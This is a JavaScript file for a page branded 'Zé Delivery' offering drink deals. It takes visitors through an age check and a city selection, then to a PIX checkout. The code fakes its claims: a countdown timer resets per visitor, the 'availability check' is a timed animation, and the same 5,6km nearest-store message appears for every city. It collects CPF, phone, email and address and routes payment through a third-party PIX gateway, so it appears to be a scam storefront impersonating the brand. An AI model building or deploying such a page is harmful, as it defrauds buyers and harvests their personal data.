// ===== Zé Delivery - JavaScript =====

// Image paths (local)
var IMG = {
  zeDelivery: "images/ze-delivery-logo.jpg",
  motoboy: "images/motoboy.png",
  zeIcon: "images/ze-icon.png",
  img1: "images/img1.png",
  img2: "images/img2.png",
  img3: "images/img3.png",
  img4: "images/img4.png",
  img5: "images/img5.png",
  img6: "images/img6.png",
  img7: "images/img7.png",
  img8: "images/img8.png",
  img9: "images/img9.png",
  img10: "images/img10.png",
  img11: "images/img11.png"
};

/* ===== COOKIE HELPERS ===== */
function setCookie(name, value, days) {
  var expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = name + "=" + encodeURIComponent(value) + "; expires=" + expires + "; path=/";
}

function getCookie(name) {
  var cookies = document.cookie.split("; ");
  for (var i = 0; i < cookies.length; i++) {
    var parts = cookies[i].split("=");
    if (parts[0] === name) return decodeURIComponent(parts[1] || "");
  }
  return "";
}

/* ===== GEOLOCATION ===== */
async function fetchLocation() {
  try {
    var response = await fetch("https://get.geojs.io/v1/ip/geo.json");
    var data = await response.json();
    return { city: data.city || "Local Desconhecido", region: data.region || "Local Desconhecido" };
  } catch (e) {
    return { city: "Local Desconhecido", region: "Local Desconhecido" };
  }
}

/* ===== MAP STATE NAMES TO UF ===== */
var estadosNomeParaUF = {};
for (var uf in estadosInput) {
  estadosNomeParaUF[estadosInput[uf]] = uf;
}

// ===== Store Status =====
(function() {
  var statusLoja = document.getElementById("status-loja");
  if (statusLoja) statusLoja.textContent = "ABERTO";
})();

// ===== Countdown Timer =====
(function() {
  var INITIAL_MINUTES = 16;
  var INITIAL_SECONDS = 33;
  var STORAGE_KEY = "countdownEndTime";

  function getEndTime() {
    var saved = localStorage.getItem(STORAGE_KEY);
    var now = Date.now();
    if (saved) {
      var savedTime = parseInt(saved, 10);
      if (!isNaN(savedTime) && savedTime > now) return savedTime;
    }
    var durationMs = (INITIAL_MINUTES * 60 + INITIAL_SECONDS) * 1000;
    var newEndTime = now + durationMs;
    localStorage.setItem(STORAGE_KEY, String(newEndTime));
    return newEndTime;
  }

  var countdownEndTime = getEndTime();

  function updateCountdown() {
    var now = Date.now();
    var remaining = Math.floor((countdownEndTime - now) / 1000);
    if (remaining < 0) remaining = 0;
    var minutes = Math.floor(remaining / 60);
    var seconds = remaining % 60;
    document.querySelectorAll("#minutes").forEach(function(el) {
      el.textContent = String(minutes).padStart(2, "0");
    });
    document.querySelectorAll("#seconds").forEach(function(el) {
      el.textContent = String(seconds).padStart(2, "0");
    });
  }

  setInterval(updateCountdown, 1000);
  updateCountdown();
})();


// ===== Update Location Display =====
function atualizarLocalizacao() {
  var cidade = getCookie("localCidade");
  var estado = getCookie("localEstado");
  if (cidade) {
    document.querySelectorAll(".local-cidade").forEach(function(el) { el.textContent = cidade; });
  }
  if (estado) {
    document.querySelectorAll(".local-estado").forEach(function(el) { el.textContent = estado; });
  }
}

/* ===== AGE VERIFICATION ===== */
async function verificarIdade() {
  var result = await Swal.fire({
    html: '<img src="' + IMG.zeIcon + '" style="width: 100px; height: 100px; margin: 0 auto 20px; display: block;"><br><p style="font-size: 20px; color: #333; font-weight: 700; font-family: \'Poppins\', sans-serif;">Você tem 18 anos ou mais?</p>',
    showDenyButton: true,
    confirmButtonText: "SIM",
    denyButtonText: "NÃO",
    confirmButtonColor: "#FFCC00",
    denyButtonColor: "#FFFFFF",
    allowOutsideClick: false,
    allowEscapeKey: false,
    didOpen: function () {
      var confirmBtn = document.querySelector(".swal2-confirm");
      var denyBtn = document.querySelector(".swal2-deny");
      if (confirmBtn) {
        confirmBtn.style.color = "#1A1A1A";
        confirmBtn.style.backgroundColor = "#FFCC00";
        confirmBtn.style.minWidth = "120px";
        confirmBtn.style.fontSize = "16px";
        confirmBtn.style.fontWeight = "700";
        confirmBtn.style.borderRadius = "6px";
        confirmBtn.style.padding = "12px 32px";
        confirmBtn.style.border = "none";
      }
      if (denyBtn) {
        denyBtn.style.color = "#1A1A1A";
        denyBtn.style.backgroundColor = "#FFFFFF";
        denyBtn.style.minWidth = "120px";
        denyBtn.style.fontSize = "16px";
        denyBtn.style.fontWeight = "700";
        denyBtn.style.borderRadius = "6px";
        denyBtn.style.padding = "12px 32px";
        denyBtn.style.border = "2px solid #CCCCCC";
      }
      var actions = document.querySelector(".swal2-actions");
      if (actions) {
        actions.style.gap = "32px";
      }
    }
  });
  return result.value === true;
}

/* ===== CITY SELECTION FLOW ===== */
async function escolherLocalizacao() {
  var cidade = getCookie("localCidade");
  var estado = getCookie("localEstado");

  if (cidade && estado) {
    atualizarLocalizacao();
    return;
  }

  var geo = await fetchLocation();
  var uf = estadosNomeParaUF[geo.region] || "";

  // Step 1: Age verification
  var isAdult = await verificarIdade();
  if (!isAdult) {
    await Swal.fire({
      title: "Acesso Negado",
      text: "Você deve ter 18 anos ou mais para acessar este site.",
      icon: "error",
      confirmButtonColor: "#FFCC00",
      didOpen: function () {
        var btn = document.querySelector(".swal2-confirm");
        if (btn) { btn.style.color = "#1A1A1A"; btn.style.border = "none"; }
      }
    });
    return;
  }

  // Step 2: Choose state (with motoboy image)
  var stateResult = await Swal.fire({
    html: '<img src="' + IMG.motoboy + '" style="width: 120px; height: auto; margin: 0 auto 15px; display: block;"><p style="font-size: 18px; color: #333; font-weight: 700; font-family: \'Poppins\', sans-serif; line-height: 1.4;">Esta oferta é exclusiva para regiões selecionadas. Informe sua região para verificar a disponibilidade.</p><p style="font-size: 14px; color: #666; margin-top: 10px;">Escolha seu estado:</p>',
    input: "select",
    inputOptions: estadosInput,
    inputPlaceholder: "Escolha seu estado",
    inputValue: uf,
    confirmButtonText: "Próximo",
    confirmButtonColor: "#FFCC00",
    allowOutsideClick: false,
    allowEscapeKey: false,
    inputValidator: function (value) { return value ? undefined : "Por favor, escolha seu estado."; },
    didOpen: function () {
      var btn = document.querySelector(".swal2-confirm");
      if (btn) { btn.style.color = "#1A1A1A"; btn.style.backgroundColor = "#FFCC00"; btn.style.fontWeight = "700"; btn.style.border = "none"; }
    }
  });

  if (!stateResult.value) return;
  var estadoEscolhido = stateResult.value;
  setCookie("localEstado", estadoEscolhido, 365);

  // Step 3: Choose city (dropdown with cities from cidades_data.js)
  var cidades = cidadesPorEstado[estadoEscolhido] || [];
  var cidadesOptions = {};
  for (var i = 0; i < cidades.length; i++) {
    cidadesOptions[String(i)] = cidades[i];
  }

  var preselect = cidades.indexOf(geo.city);

  var cityResult = await Swal.fire({
    title: "Agora, selecione a cidade",
    input: "select",
    inputOptions: cidadesOptions,
    inputValue: preselect >= 0 ? String(preselect) : "",
    confirmButtonText: "Procurar loja mais próxima!",
    confirmButtonColor: "#FFCC00",
    allowOutsideClick: false,
    allowEscapeKey: false,
    inputValidator: function (value) { return value ? undefined : "Por favor, escolha sua cidade."; },
    didOpen: function () {
      var btn = document.querySelector(".swal2-confirm");
      if (btn) { btn.style.color = "#1A1A1A"; btn.style.backgroundColor = "#FFCC00"; btn.style.fontWeight = "700"; btn.style.border = "none"; }
    }
  });

  if (cityResult.value === undefined) return;
  var cidadeEscolhida = cidades[Number(cityResult.value)];
  setCookie("localCidade", cidadeEscolhida, 365);

  // Step 4: Loading - "Verificando a disponibilidade na sua região..."
  await Swal.fire({
    title: "Verificando a disponibilidade na sua região...",
    html: 'Procurando lojas participantes em <b>' + cidadeEscolhida + '</b>...',
    timer: 2000,
    timerProgressBar: true,
    allowOutsideClick: false,
    didOpen: function () { Swal.showLoading(); }
  });

  // Step 5: Confirmation - "A loja mais próxima fica a 5,6km..."
  await Swal.fire({
    html: 'A loja mais próxima fica a <b>5,6km</b> de você! Seu pedido chegará em cerca de 30 minutos.',
    icon: "success",
    confirmButtonText: "Ver Bebidas Em Oferta",
    confirmButtonColor: "#FFCC00",
    allowOutsideClick: false,
    didOpen: function () {
      var btn = document.querySelector(".swal2-confirm");
      if (btn) { btn.style.color = "#1A1A1A"; btn.style.backgroundColor = "#FFCC00"; btn.style.fontWeight = "700"; btn.style.border = "none"; }
    }
  });

  atualizarLocalizacao();
}

// ===== PIX CHECKOUT =====

var pixAtualCodigo = '';

async function abrirCheckoutPix(el) {
  var produto       = el.getAttribute('data-produto');
  var valor         = parseFloat(el.getAttribute('data-valor'));
  var imgSrc        = el.getAttribute('data-img');
  var valorFormatado = valor.toFixed(2).replace('.', ',');

  // ── Etapa 1: dados pessoais ────────────────────────────────────────────────
  var resultado = await Swal.fire({
    title: '<span style="font-size:17px">Finalizar Pedido</span>',
    html: '<div style="text-align:center;margin-bottom:14px">'
        +   '<img src="' + imgSrc + '" style="width:64px;height:64px;object-fit:contain;border-radius:10px;border:2px solid #eee;">'
        +   '<p style="margin:7px 0 2px;font-weight:700;color:#333;font-size:14px">' + produto + '</p>'
        +   '<p style="font-size:19px;font-weight:700;color:#077c22">R$ ' + valorFormatado + '</p>'
        + '</div>'
        + '<hr style="border:none;border-top:1px solid #eee;margin-bottom:12px">'

        + '<p style="font-size:12px;font-weight:700;color:#444;text-align:left;margin-bottom:8px;text-transform:uppercase;letter-spacing:.5px">📋 Dados pessoais</p>'
        + '<input id="pix-nome"  class="swal2-input" placeholder="Nome completo *" style="margin-bottom:7px">'
        + '<input id="pix-cpf"   class="swal2-input" placeholder="CPF * (000.000.000-00)" maxlength="14" style="margin-bottom:7px">'
        + '<input id="pix-tel"   class="swal2-input" placeholder="WhatsApp * (DDD + número)" maxlength="15" style="margin-bottom:7px">'
        + '<input id="pix-email" class="swal2-input" placeholder="E-mail *" style="margin-bottom:7px">'

        + '<p style="font-size:12px;font-weight:700;color:#444;text-align:left;margin:12px 0 8px;text-transform:uppercase;letter-spacing:.5px">📦 Endereço de entrega</p>'
        + '<input id="pix-cep"         class="swal2-input" placeholder="CEP * (00000-000)" maxlength="9" style="margin-bottom:7px">'
        + '<input id="pix-rua"         class="swal2-input" placeholder="Rua / Avenida *" style="margin-bottom:7px">'
        + '<div style="display:flex;gap:6px;margin-bottom:7px">'
        +   '<input id="pix-numero"    class="swal2-input" placeholder="Número *" style="margin:0;width:35%">'
        +   '<input id="pix-compl"     class="swal2-input" placeholder="Complemento" style="margin:0;flex:1">'
        + '</div>'
        + '<input id="pix-bairro"      class="swal2-input" placeholder="Bairro *" style="margin-bottom:7px">'
        + '<div style="display:flex;gap:6px;margin-bottom:0">'
        +   '<input id="pix-cidade"    class="swal2-input" placeholder="Cidade *" style="margin:0;flex:1">'
        +   '<input id="pix-estado"    class="swal2-input" placeholder="Estado *" maxlength="2" style="margin:0;width:28%;text-transform:uppercase">'
        + '</div>',

    confirmButtonText:  'Gerar PIX →',
    confirmButtonColor: '#FFCC00',
    showCancelButton:   true,
    cancelButtonText:   'Voltar',
    cancelButtonColor:  '#ffffff',
    allowOutsideClick:  false,
    width: '520px',
    didOpen: function() {
      var confirmBtn = document.querySelector('.swal2-confirm');
      var cancelBtn  = document.querySelector('.swal2-cancel');
      if (confirmBtn) { confirmBtn.style.color = '#1A1A1A'; confirmBtn.style.fontWeight = '700'; confirmBtn.style.border = 'none'; }
      if (cancelBtn)  { cancelBtn.style.color  = '#666';    cancelBtn.style.border = '1px solid #ccc'; }

      // Máscara CPF
      document.getElementById('pix-cpf').addEventListener('input', function() {
        var v = this.value.replace(/\D/g, '').slice(0, 11);
        if      (v.length > 9) v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6,9)+'-'+v.slice(9);
        else if (v.length > 6) v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6);
        else if (v.length > 3) v = v.slice(0,3)+'.'+v.slice(3);
        this.value = v;
      });

      // Máscara telefone
      document.getElementById('pix-tel').addEventListener('input', function() {
        var v = this.value.replace(/\D/g, '').slice(0, 11);
        if      (v.length > 10) v = '('+v.slice(0,2)+') '+v.slice(2,7)+'-'+v.slice(7);
        else if (v.length > 6)  v = '('+v.slice(0,2)+') '+v.slice(2,6)+'-'+v.slice(6);
        else if (v.length > 2)  v = '('+v.slice(0,2)+') '+v.slice(2);
        this.value = v;
      });

      // Máscara CEP + auto-preenchimento via ViaCEP
      document.getElementById('pix-cep').addEventListener('input', function() {
        var v = this.value.replace(/\D/g, '').slice(0, 8);
        if (v.length > 5) v = v.slice(0,5)+'-'+v.slice(5);
        this.value = v;
        if (v.replace('-','').length === 8) {
          fetch('https://viacep.com.br/ws/' + v.replace('-','') + '/json/')
            .then(function(r){ return r.json(); })
            .then(function(d){
              if (!d.erro) {
                document.getElementById('pix-rua').value    = d.logradouro || '';
                document.getElementById('pix-bairro').value = d.bairro     || '';
                document.getElementById('pix-cidade').value = d.localidade || '';
                document.getElementById('pix-estado').value = d.uf         || '';
                document.getElementById('pix-numero').focus();
              }
            }).catch(function(){});
        }
      });

      // Estado sempre maiúsculo
      document.getElementById('pix-estado').addEventListener('input', function() {
        this.value = this.value.toUpperCase().replace(/[^A-Z]/g,'');
      });
    },

    preConfirm: function() {
      // Dados pessoais
      var nome   = document.getElementById('pix-nome').value.trim();
      var cpf    = document.getElementById('pix-cpf').value.replace(/\D/g, '');
      var tel    = document.getElementById('pix-tel').value.replace(/\D/g, '');
      var email  = document.getElementById('pix-email').value.trim();
      // Endereço
      var cep    = document.getElementById('pix-cep').value.trim();
      var rua    = document.getElementById('pix-rua').value.trim();
      var numero = document.getElementById('pix-numero').value.trim();
      var compl  = document.getElementById('pix-compl').value.trim();
      var bairro = document.getElementById('pix-bairro').value.trim();
      var cidade = document.getElementById('pix-cidade').value.trim();
      var estado = document.getElementById('pix-estado').value.trim();

      if (!nome || nome.split(/\s+/).length < 2) {
        Swal.showValidationMessage('Informe seu nome e sobrenome.');
        return false;
      }
      if (cpf.length !== 11) {
        Swal.showValidationMessage('CPF inválido — informe os 11 dígitos.');
        return false;
      }
      if (tel.length < 10 || tel.length > 11) {
        Swal.showValidationMessage('Telefone inválido — informe DDD + número (ex: 11999999999).');
        return false;
      }
      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        Swal.showValidationMessage('Informe um e-mail válido.');
        return false;
      }
      if (!cep || cep.replace('-','').length !== 8) {
        Swal.showValidationMessage('CEP inválido.');
        return false;
      }
      if (!rua)    { Swal.showValidationMessage('Informe a rua/avenida.');  return false; }
      if (!numero) { Swal.showValidationMessage('Informe o número.');       return false; }
      if (!bairro) { Swal.showValidationMessage('Informe o bairro.');       return false; }
      if (!cidade) { Swal.showValidationMessage('Informe a cidade.');       return false; }
      if (!estado || estado.length !== 2) { Swal.showValidationMessage('Informe o estado (UF, ex: SP).'); return false; }

      return { nome: nome, cpf: cpf, tel: tel, email: email,
               cep: cep, rua: rua, numero: numero, compl: compl,
               bairro: bairro, cidade: cidade, estado: estado };
    }
  });

  if (!resultado.value) return;
  var dados = resultado.value;

  // ── Etapa 2: loading ───────────────────────────────────────────────────────
  Swal.fire({
    title: 'Gerando seu PIX...',
    html:  '<p style="color:#777;font-size:14px">Aguarde um instante...</p>',
    allowOutsideClick: false,
    allowEscapeKey:    false,
    didOpen: function() { Swal.showLoading(); }
  });

  // ── Etapa 3: chamar o backend ──────────────────────────────────────────────
  var transacao;
  try {
    var response = await fetch('/api/criar-pix', {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({
        produto: produto,
        valor:   valor,
        nome:    dados.nome,
        cpf:     dados.cpf,
        tel:     dados.tel,
        email:   dados.email
        // endereço (cep, rua, numero, bairro, cidade, estado) fica só no front
      })
    });
    transacao = await response.json();
    if (!response.ok) throw new Error(JSON.stringify(transacao));
  } catch (err) {
    var mensagemErro = err.message || 'Erro desconhecido';
    if (err instanceof TypeError && location.protocol === 'file:') {
      mensagemErro = 'Servidor não encontrado. Abra via http://localhost:3000 e não pelo arquivo diretamente.';
    }
    await Swal.fire({
      icon:               'error',
      title:              'Erro ao gerar PIX',
      html:               '<p style="font-size:13px;color:#555;word-break:break-word;text-align:left;background:#f8f8f8;padding:10px;border-radius:6px;max-height:120px;overflow:auto;">' + mensagemErro + '</p>',
      confirmButtonColor: '#FFCC00',
      confirmButtonText:  'OK',
      didOpen: function() {
        var btn = document.querySelector('.swal2-confirm');
        if (btn) btn.style.color = '#1A1A1A';
      }
    });
    return;
  }

  // ── Etapa 4: extrair dados PIX da resposta ────────────────────────────────
  // Estrutura Sunize: { id, pix: { payload }, status, hasError }
  var pixCode = (transacao.pix && transacao.pix.payload) ? transacao.pix.payload : '';
  var txId    = transacao.id || '';

  // Sunize não retorna imagem — gera QR a partir do payload
  var pixImg = pixCode
    ? 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(pixCode)
    : '';

  pixAtualCodigo = pixCode;
  mostrarPixModal(produto, valorFormatado, pixCode, pixImg, txId);
}

function mostrarPixModal(produto, valorFormatado, pixCode, pixImg, txId) {
  var checkInterval;

  // QR Code com fallback de erro de imagem
  var qrHtml = pixImg
    ? '<img id="pix-qr-img" src="' + pixImg + '" alt="QR Code PIX"'
    +   ' style="width:210px;height:210px;display:block;margin:0 auto 14px;border:2px solid #eee;border-radius:10px;"'
    +   ' onerror="this.onerror=null;this.src=\'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data='+encodeURIComponent(pixCode||'PIX')+'\'">'
    : '';

  var codigoHtml = pixCode
    ? '<div style="background:#f5f5f5;border:1px solid #ddd;border-radius:8px;padding:10px 12px;margin:10px 0 8px;word-break:break-all;font-size:11px;font-family:monospace;color:#444;text-align:left;max-height:68px;overflow:auto;line-height:1.5;">' + pixCode + '</div>'
    + '<button id="btn-copiar-pix" onclick="copiarPix()" style="background:#FFCC00;color:#1A1A1A;border:none;padding:13px 0;border-radius:8px;font-weight:700;cursor:pointer;font-size:15px;width:100%;letter-spacing:.2px;">📋 Copiar código PIX</button>'
    : '<p style="color:#bbb;font-size:13px;margin:8px 0;">Código PIX não disponível.</p>';

  Swal.fire({
    title: '<span style="color:#077c22">✅ PIX Gerado!</span>',
    html:  '<div style="text-align:center">'
         +   '<p style="color:#555;margin-bottom:2px">' + produto + '</p>'
         +   '<p style="font-size:22px;font-weight:700;color:#077c22;margin-bottom:16px">R$ ' + valorFormatado + '</p>'
         +   qrHtml
         +   '<p style="font-size:13px;color:#777;margin-bottom:4px">📱 Escaneie o QR Code ou copie o código:</p>'
         +   codigoHtml
         +   '<div id="pix-status-msg" style="margin-top:14px;padding:10px 12px;border-radius:8px;background:#fff8dc;color:#7a6000;font-size:13px;font-weight:600;">'
         +     '⏳ Aguardando confirmação do pagamento...'
         +   '</div>'
         +   '<p style="font-size:11px;color:#ccc;margin-top:10px;">Este PIX expira em 30 minutos</p>'
         + '</div>',
    confirmButtonText:  'Fechar',
    confirmButtonColor: '#FFCC00',
    allowOutsideClick:  false,
    didOpen: function() {
      var btn = document.querySelector('.swal2-confirm');
      if (btn) { btn.style.color = '#1A1A1A'; btn.style.fontWeight = '700'; }
      if (txId) {
        checkInterval = setInterval(function() { verificarPagamento(txId, checkInterval); }, 5000);
      }
    },
    willClose: function() {
      if (checkInterval) clearInterval(checkInterval);
    }
  });
}

async function verificarPagamento(txId, interval) {
  try {
    var response = await fetch('/api/status-pix/' + txId);
    var data     = await response.json();
    var status   = (data.status || '').toLowerCase();
    var msgEl    = document.getElementById('pix-status-msg');

    if (status === 'authorized' || status === 'paid' || status === 'approved' || status === 'completed') {
      if (interval) clearInterval(interval);
      if (msgEl) {
        msgEl.style.background = '#d4edda';
        msgEl.style.color      = '#155724';
        msgEl.textContent      = '✅ Pagamento confirmado!';
      }
      setTimeout(function() {
        Swal.fire({
          icon:               'success',
          title:              '🎉 Pedido Confirmado!',
          text:               'Seu pagamento foi aprovado! Em breve você receberá uma confirmação.',
          confirmButtonColor: '#FFCC00',
          confirmButtonText:  'Ótimo!',
          didOpen: function() {
            var btn = document.querySelector('.swal2-confirm');
            if (btn) btn.style.color = '#1A1A1A';
          }
        });
      }, 800);
    }
  } catch (e) { /* silencioso */ }
}

function copiarPix() {
  var codigo = pixAtualCodigo;
  if (!codigo) return;

  function onSuccess() {
    var btn = document.getElementById('btn-copiar-pix');
    if (!btn) return;
    btn.textContent       = '✅ Copiado!';
    btn.style.background  = '#077c22';
    btn.style.color       = '#fff';
    setTimeout(function() {
      btn.textContent      = '📋 Copiar código PIX';
      btn.style.background = '#FFCC00';
      btn.style.color      = '#1A1A1A';
    }, 3000);
  }

  if (navigator.clipboard) {
    navigator.clipboard.writeText(codigo).then(onSuccess).catch(function() { fallbackCopiar(codigo, onSuccess); });
  } else {
    fallbackCopiar(codigo, onSuccess);
  }
}

function fallbackCopiar(texto, callback) {
  var ta        = document.createElement('textarea');
  ta.value      = texto;
  ta.style.position = 'fixed';
  ta.style.left     = '-9999px';
  document.body.appendChild(ta);
  ta.focus(); ta.select();
  try { document.execCommand('copy'); if (callback) callback(); } catch (e) {}
  document.body.removeChild(ta);
}

// ===== INIT =====
document.addEventListener("DOMContentLoaded", function() {
  escolherLocalizacao();
});
